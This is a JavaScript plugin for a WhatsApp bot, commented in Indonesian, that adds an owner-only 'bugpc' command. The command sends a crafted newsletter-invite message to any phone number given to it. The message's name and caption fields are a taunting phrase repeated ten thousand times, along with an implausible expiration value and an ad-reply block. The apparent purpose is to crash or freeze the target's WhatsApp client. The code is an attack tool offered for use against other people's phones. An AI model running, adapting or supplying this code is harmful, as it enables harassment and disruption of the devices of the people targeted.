// 📝 plugin bug - bugpc

// 📝 plugin owner - bug

// ✨ Plugin bug - bug ke nomor tujuan ✨

const crypto = require('crypto');

const handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
  if (!isOwner) return m.reply('Fitur ini hanya untuk owner.');
  if (!args[0]) return m.reply(`Contoh: ${usedPrefix + command} 6283138114398`);

  const number = args[0].replace(/\D/g, '');
  const jid = number + '@s.whatsapp.net';

  const repeatedText = "JAWA WOI ANJING😈😈😈 ".repeat(10000).trim();
  const thumbnailBase64 = "iVBORw0KGgoAAAANSUhEUgAAA...base64mu..."; // Ganti dengan base64 asli

  try {
    await conn.relayMessage(jid, {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363410793796223@newsletter", // Bisa disesuaikan
        newsletterName: repeatedText,
        jpegThumbnail: Buffer.from(thumbnailBase64, 'base64'),
        caption: repeatedText,
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600000000}`,
        contextInfo: {
          stanzaId: m.key.id,
          participant: conn.user.id,
          externalAdReply: {
            title: "ARMAN GANTENG😈😈",
            body: "ARMAN GANTENG 😈😈",
            thumbnail: Buffer.from(thumbnailBase64, 'base64'),
            sourceUrl: "https://whatsapp.com/channel/invite/0029VasizxI47XeE2iiave0u",
            mediaType: 1,
            showAdAttribution: true,
            renderLargerThumbnail: true
          }
        }
      }
    }, { messageId: crypto.randomUUID() });

    m.reply(`Berhasil dikirim ke ${number}`);
  } catch (err) {
    console.error(err);
    m.reply('Gagal mengirim pesan. Pastikan nomor valid dan tidak memblokir bot.');
  }
};

handler.command = ['bugpc'];
handler.help = ['bugpc <nomor>'];
handler.tags = ['bug'];
handler.rowner = true;

module.exports = handler;